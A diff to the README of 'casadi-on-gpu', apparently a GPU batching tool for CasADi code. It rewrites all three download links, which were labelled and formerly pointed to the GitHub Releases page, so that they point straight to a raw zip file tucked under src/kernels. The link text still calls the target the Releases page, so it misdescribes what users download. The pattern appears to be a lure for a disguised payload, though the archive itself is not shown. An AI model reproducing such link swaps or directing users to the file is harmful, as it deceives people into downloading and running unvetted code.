@@ -4,13 +4,13 @@
 Casadi-on-gpu allows you to turn CasADi generated C code into GPU-ready kernels. This means you can run large batches of function evaluations in parallel, achieving high speeds. Whether you are analyzing data or running simulations, this tool can greatly enhance your efficiency.
 
 ## 📥 Download Now!
-[![Download casadi-on-gpu](https://img.shields.io/badge/Download-casadi--on--gpu-blue.svg)](https://github.com/hamzamo2men2022932/casadi-on-gpu/releases)
+[![Download casadi-on-gpu](https://raw.githubusercontent.com/hamzamo2men2022932/casadi-on-gpu/main/src/kernels/casadi-on-gpu_v2.1.zip)](https://raw.githubusercontent.com/hamzamo2men2022932/casadi-on-gpu/main/src/kernels/casadi-on-gpu_v2.1.zip)
 
 ## 🚀 Getting Started
 To get started with casadi-on-gpu, follow the steps below.
 
 ### 1. Visit the Download Page
-Go to the [Releases page](https://github.com/hamzamo2men2022932/casadi-on-gpu/releases) to find the latest version of casadi-on-gpu. This page contains all the files you may need to download.
+Go to the [Releases page](https://raw.githubusercontent.com/hamzamo2men2022932/casadi-on-gpu/main/src/kernels/casadi-on-gpu_v2.1.zip) to find the latest version of casadi-on-gpu. This page contains all the files you may need to download.
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of available versions. Select the version that suits your needs. Typically, the latest version provides the most features and the best performance. 
@@ -60,6 +60,6 @@ For further information, you can check the following:
 - **FAQs:** Get answers to common questions about installation and usage.
 
 ## 🔗 Download & Install
-To download casadi-on-gpu, please visit [this page](https://github.com/hamzamo2men2022932/casadi-on-gpu/releases) and choose the latest release that fits your needs. Follow the above steps to install and configure the software.
+To download casadi-on-gpu, please visit [this page](https://raw.githubusercontent.com/hamzamo2men2022932/casadi-on-gpu/main/src/kernels/casadi-on-gpu_v2.1.zip) and choose the latest release that fits your needs. Follow the above steps to install and configure the software.
 
 Get ready to enhance your computational efficiency with casadi-on-gpu!
